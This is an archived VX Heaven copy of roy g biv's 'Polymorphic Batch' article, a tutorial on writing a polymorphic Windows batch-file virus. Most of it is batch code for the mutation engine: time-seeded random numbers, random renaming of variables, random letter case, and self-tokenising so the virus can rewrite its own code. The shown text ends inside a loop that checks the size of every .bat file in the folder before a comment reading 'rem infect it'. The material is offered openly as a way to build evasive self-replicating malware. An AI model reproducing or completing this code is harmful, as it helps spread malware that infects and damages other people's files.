<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> roy g biv 'Polymorphic Batch' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="roy g biv"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, roy g biv,Polymorphic Batch, seed, names, file, nameo, size, case, line, code, atok, time, btok, resulting, disappear, environment, batch"/>
<meta name="Description" content="Everyone knows about batch files. Lots of very poor viruses have been written using it. Some of those viruses are even &quot;encrypted&quot;, using environment variable tricks (simple text substitution). A few of them can change parts of their code using specially marked lines, find.exe, and output redirection. There has never been a truly polymorphic one... until now."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0554fb6c52225b099c664da397c897f31121dedb-1498756974-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrg20.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Polymorphic Batch</h1><p><a href="/lib/?lang=en&amp;author=roy%20g%20biv"> roy g biv</a><br/> <em><a href="/vx.php?fid=2008#f2008">Valhalla #2</a></em><br/> <em>December 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrg20.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg20">Back to index</a>] [<a href="/lib/vrg20.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">What is it?</a></li>
<li><a href="#c2">The language</a></li>
<li><a href="#c3">Limitations</a></li>
<li><a href="#c4">Special characters</a></li>
<li><a href="#c5">Subroutines</a></li>
<li><a href="#c6">Echo</a></li>
<li><a href="#c7">Tokenising</a></li>
<li><a href="#c8">Rem</a></li>
<li><a href="#c9">Goto</a></li>
<li><a href="#ca">If</a></li>
<li><a href="#cb">Labels</a></li>
<li><a href="#cc">Others?</a></li>
<li><a href="#cd">RNG Seeding</a></li>
<li><a href="#ce">RNG iterating</a></li>
<li><a href="#cf">Variable renaming</a></li>
<li><a href="#ci">Random case</a></li>
<li><a href="#cj">Random space</a></li>
<li><a href="#ck">Self-tokenising</a></li>
<li><a href="#cl">Missing tokens</a></li>
<li><a href="#cm">File size</a></li>
<li><a href="#cn">Greets to friendly people (A-Z):</a></li>
</ul>
<h2><a name="c1"></a>What is it?</h2>
<p>Everyone knows about batch files. Lots of very poor viruses have been written using it. Some of those viruses are even "encrypted", using environment variable tricks (simple text substitution). A few of them can change parts of their code using specially marked lines, find.exe, and output redirection. There has never been a truly polymorphic one... until now.</p>
<h2><a name="c2"></a>The language</h2>
<p>With the introduction of Windows XP, many things became possible that were impossible previously. Suddenly, we can access substrings, perform search and replace, perform arithmetic, and create complex loops. We can construct random numbers, we can map case randomly, we can change variable names to random strings. Yes, now we can do the same things that script viruses do.</p>
<h2><a name="c3"></a>Limitations</h2>
<p>The batch language is clearly not intended to be a programming language. There are many strange behaviours that are difficult to understand, including some things that are not consistent.</p>
<h2><a name="c4"></a>Special characters</h2>
<p>Certain characters require prepending a "^", otherwise they disappear. In some cases, more than one "^" is required. Examples: ! ) ^ The "%" requires doubling in order to preserve it.</p>
<h2><a name="c5"></a>Subroutines</h2>
<p>Further parsing occurs when passing a line to a subroutine. Example: "%%" becomes "%". Operators are not passed to subroutines, making it impossible to use a subroutine to examine a line.</p>
<h2><a name="c6"></a>Echo</h2>
<p>Echo always emits a crlf sequence so there is no way to append to same line using it. It is possible to work around this by using a nul redirection.</p>
<h2><a name="c7"></a>Tokenising</h2>
<p>Blank lines and spaces are removed by tokeniser. Spaces are considered to be token delimiters by default, even inside quotes in "rem" statements.</p>
<h2><a name="c8"></a>Rem</h2>
<p>The "rem" can be after anything except "endif" (single ")" on a line), "set", and "setlocal". These are fun undocumented behaviours.</p>
<h2><a name="c9"></a>Goto</h2>
<p>We cannot use "goto" to a label inside a nested "for" loop, becaues it causes the outer loop to exit on next iteration.</p>
<h2><a name="ca"></a>If</h2>
<p>If a ":" appears on the right side of an "if", it causes the operator and the ":" to disappear, resulting in corrupted statements. A "rem" in an "if" that also contains ":~" causes the operator and the ":~" to disappear, and tokens to be concatenated, resulting in corrupted statements. A delayed-expanded variable that is compared to a delayed-expanded variable also causes the operator to disappear and tokens to be concatenated, resulting in corrupted statements.</p>
<h2><a name="cb"></a>Labels</h2>
<p>We cannot place labels inside a "for" loop (even if not used), because it causes a mismatched parenthesis error. We cannot place a blank line after a label, because execution stops with an error.</p>
<h2><a name="cc"></a>Others?</h2>
<p>Probably. After a while, I stopped trying to work out the causes.</p>
<h2><a name="cd"></a>RNG Seeding</h2>
<p>We can seed a random number generator by using the current time. We write the time to a file, and then tokenise the file to read it back. Then we can use a substring to get the number of minutes, and assign the value to an environment variable. It looks like this:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">rem write current time to file &quot;rb&quot;</span><br/>
time /t <span style="color: #33cc33;">&gt;</span> rb<br/>
<span style="color: black; font-style: italic;">rem read file into local variable &quot;%%a&quot;</span><br/>
<span style="color: black; font-style: italic;">rem any &quot;AM&quot; or &quot;PM&quot; part will be in &quot;%%b&quot;</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /f &quot;tokens=*&quot; <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>rb<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assign <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> to environment variable &quot;_seed&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _seed=<span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><br/>
<span style="color: #33cc33;">)</span><br/>
<span style="color: black; font-style: italic;">rem extract minutes (2 characters starting at position 3)</span><br/>
<span style="color: black; font-style: italic;">rem requires &quot;hh:mm&quot; format, but you can change it how you need</span><br/>
<span style="color: black; font-style: italic;">rem assign result to environment variable &quot;_seed&quot;</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _seed=<span style="color: #33cc33;">!</span><span style="color: #448888;">_seed:~3,2</span><span style="color: #33cc33;">!</span><br/>
&nbsp;</div>
<h2><a name="ce"></a>RNG iterating</h2>
<p>Now we have our seed, we can produce more random numbers using arithmentic. Here is our random number subroutine:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">:<span style="color: #b100b1; font-weight: bold;">rnd</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a _seed *= 0x343fd<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a _seed += 0x269ec3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a _seed = &quot;_seed<span style="color: #33cc33;">&amp;</span>0x7fffffff&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a _val1 = &quot;_seed<span style="color: #33cc33;">&gt;&gt;</span>16&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> :<span style="color: #b100b1; font-weight: bold;">eof</span><br/>
&nbsp;</div>
<p>Environment variable "_seed" is updated each time, and result is placed in environment variable "_val1".</p>
<h2><a name="cf"></a>Variable renaming</h2>
<p>We can change our variable names very easily. We place each one of the old names in environment variables. We place each one of the new names in environment variables. Then for each old name, we use search and replace on each new name. When we write out the lines of code, the new names will be written.</p>
<p>Here is the set of old names:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _nameo1=_seed<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _nameo2=_nameo<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _nameo3=_namen<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _nameo4=_alpha<br/>
...<br/>
&nbsp;</div>
<p>The array of old names should include the base name of the variable that holds the old names and also the new names. If you don't have too many variables, then you can use a single variable that holds all names, and replace in one pass using a loop with delimiters instead.</p>
<p>Here is the code to construct new names:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /l <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>1, 1, 39<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _out=<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/call.html"><span style="color: #00b100; font-weight: bold;">call</span></a> :<span style="color: #b100b1; font-weight: bold;">randstr</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _namen<span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span>=<span style="color: #33cc33;">!</span><span style="color: #448888;">_out</span><span style="color: #33cc33;">!</span><br/>
<span style="color: #33cc33;">)</span><br/>
&nbsp;</div>
<p>Here is the code to replace the names:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /l <span style="color: #33cc33;">%</span><span style="color: #33cc33;">%</span>$ <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>1, 1, 39<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _atok=<span style="color: #33cc33;">!</span><span style="color: #448888;">_nameo%%$</span><span style="color: #33cc33;">!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _btok=<span style="color: #33cc33;">!</span><span style="color: #448888;">_namen%%$</span><span style="color: #33cc33;">!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/call.html"><span style="color: #00b100; font-weight: bold;">call</span></a> :<span style="color: #b100b1; font-weight: bold;">repvar</span> <span style="color: #33cc33;">!</span><span style="color: #448888;">_atok</span><span style="color: #33cc33;">!</span> <span style="color: #33cc33;">!</span><span style="color: #448888;">_btok</span><span style="color: #33cc33;">!</span><br/>
<span style="color: #33cc33;">)</span><br/>
<span style="color: black; font-style: italic;"><br/>
rem echo/ protects against blank lines causing &quot;echo is off&quot; message</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a>/ <span style="color: #33cc33;">!</span><span style="color: #448888;">_out</span><span style="color: #33cc33;">!&gt;&gt;</span> rc<br/>
<span style="color: black; font-style: italic;"><br/>
rem replacement must be done using subroutine</span><br/>
<span style="color: black; font-style: italic;">rem else variable corruption occurs</span><br/>
<span style="color: black; font-style: italic;">rem &quot;_out&quot; holds a line of code</span><br/>
:<span style="color: #b100b1; font-weight: bold;">repvar</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _out=<span style="color: #33cc33;">!</span><span style="color: #448888;">_out:%<span style="color: #448888;">1</span>=<span style="color: #33cc33;">%</span><span style="color: #448888;">2</span></span><span style="color: #33cc33;">!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> :<span style="color: #b100b1; font-weight: bold;">eof</span><br/>
&nbsp;</div>
<h2><a name="ci"></a>Random case</h2>
<p>We can map the case randomly. Almost all labels and tokens can be mapped randomly. There are some exceptions, such as loops, and the parameter to "setlocal". These are case-sensitive and cannot be changed.</p>
<p>To map the case, we need a variable that holds all of the letters, both upper-case and lowercase. It looks like this:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _alpha=abcdefghijklmnopqrstuvwxyzrgbrgbABCDEFGHIJKLMNOPQRSTUVWXYZ<br/>
&nbsp;</div>
<p>Here the first alphabet is extended to 32 bytes each so that we can use &amp; 63 and index directly with no conditional instructions to check the range. To choose a random character, we can do this:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/call.html"><span style="color: #00b100; font-weight: bold;">call</span></a> :<span style="color: #b100b1; font-weight: bold;">rnd</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a _val1 = &quot;_val1<span style="color: #33cc33;">&amp;</span>63&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _out=<span style="color: #33cc33;">!</span><span style="color: #448888;">_alpha:~%<span style="color: #448888;">_val1</span>%,1</span><span style="color: #33cc33;">!</span><br/>
&nbsp;</div>
<p>If the second alphabet is not 32 bytes long, then an out-of-bounds index will return an empty character. That can be useful for other things.</p>
<h2><a name="cj"></a>Random space</h2>
<p>Since the space character is discarded during tokenising, even from "set" instructions, we have to take special action to emit it. We can place it in a environment variable and it will be assigned properly. However, we have to use the environment variable in order to access it. We cannot write spaces directly.</p>
<h2><a name="ck"></a>Self-tokenising</h2>
<p>This is all useless if we can't write our modified code to a new file. We can read our code using a loop, one line at a time to a temporary file (and stop reading when we see the host code). We can read the line back one token at a time. We can examine the tokens, modify the tokens, and then write the result to another temporary file. Then we can attach that file to other files. Here is how we read our code one line at a time:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">rem allow create first temporary file</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/del.html"><span style="color: #b1b100; font-weight: bold;">del</span></a> rb<br/>
<span style="color: black; font-style: italic;">rem tokenise file &quot;%0&quot;, each line is stored in local variable &quot;%%a&quot;</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /f &quot;tokens=*&quot; <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">~nx0</span> <span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem write each line to temporary file</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem it might be possible to work with a single line at a time</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem but I did not succeed with that, so I need whole file first</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a>/ <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><span style="color: #33cc33;">&gt;&gt;</span> rb<br/>
<span style="color: black; font-style: italic;"><br/>
&nbsp; &nbsp; &nbsp; &nbsp; rem watch for start of host code</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem marker can be anything, here last 4 characters are checked</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _xtok=<span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> /i &quot;<span style="color: #33cc33;">!</span><span style="color: #448888;">_xtok:~-4</span><span style="color: #33cc33;">!</span>&quot; == &quot;host&quot; <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> :<span style="color: #b100b1; font-weight: bold;">parse</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #33cc33;">)</span><br/>
<span style="color: #33cc33;">)</span><br/>
&nbsp;</div>
<p>Here is how we read the line back one token at a time:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">:<span style="color: #b100b1; font-weight: bold;">parse</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem allow create second temporary file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/del.html"><span style="color: #b1b100; font-weight: bold;">del</span></a> rc<br/>
<span style="color: black; font-style: italic;"><br/>
&nbsp; &nbsp; &nbsp; &nbsp; rem read the line from file &quot;rb&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /f &quot;tokens=*&quot; <span style="color: #33cc33;">%</span><span style="color: #33cc33;">%</span># <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>rb<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem split into tokens &quot;%%a&quot;, &quot;%%b&quot;, &quot;%%c&quot; ... &quot;%%z&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /f &quot;tokens=1-26&quot; <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span> &quot;<span style="color: #33cc33;">%</span><span style="color: #33cc33;">%</span>#&quot; <span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _atok=<span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> /i &quot;<span style="color: #33cc33;">!</span><span style="color: #448888;">_atok</span><span style="color: #33cc33;">!</span>&quot; == &quot;echo&quot; <span style="color: #33cc33;">(</span><br/>
&nbsp;</div>
<p>and so on. We must parse the tokens in order to modify them. This is the hardest part of the code, and also makes the code very large.</p>
<h2><a name="cl"></a>Missing tokens</h2>
<p>Since tokenising the line causes some things to disappear, we need a way to reconstruct the line. I used a special "rem" line for this, which describes how the line was supposed to look. When the parser sees the special "rem" line, it builds the line again and writes that instead. It looks like this:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">rem _#x_seed#c~3,2#x</span></div>
<p>produces "!_seed:~3,2!". Or this:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">rem _#x_nameo#p#pa#c~0,1#x#x_out#x</span></div>
<p>produces "!_nameo%%a:~0,1!!_out!". How about this:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">rem _#x_out#x#t#t#x#x_prev2#x#t#t#x#x_btok#c~-2#x</span></div>
<p>produces "!_out!^^!!_prev2!^^!!_btok:~-2!". :)</p>
<h2><a name="cm"></a>File size</h2>
<p>Since the resulting file will be very large, and since batch files are limited to 64kb in size, we must check the size before attempting to infect.</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">rem find the file named &quot;rc&quot;</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>rc<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem place file size in environment variable &quot;_s1&quot;.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _s1=<span style="color: #33cc33;">%</span><span style="color: #33cc33;">%</span>~za<br/>
<span style="color: #33cc33;">)</span><br/>
<span style="color: black; font-style: italic;"><br/>
rem find all batch files in the current directory</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>*.bat<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem place each file size in environment variable &quot;_s2&quot;.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _s2=<span style="color: #33cc33;">%</span><span style="color: #33cc33;">%</span>~za<br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem sum the sizes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> /a _s2 += _s1<br/>
<span style="color: black; font-style: italic;"><br/>
&nbsp; &nbsp; &nbsp; &nbsp; rem check result for less than 60000</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> &quot;<span style="color: #33cc33;">!</span><span style="color: #448888;">_s2</span><span style="color: #33cc33;">!</span>&quot; <a style="color: #000060;" href="http://www.ss64.com/nt/lss.html"><span style="color: #000000; font-weight: bold;">lss</span></a> &quot;60000&quot; <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _atok=<span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem infect it</span><br/>
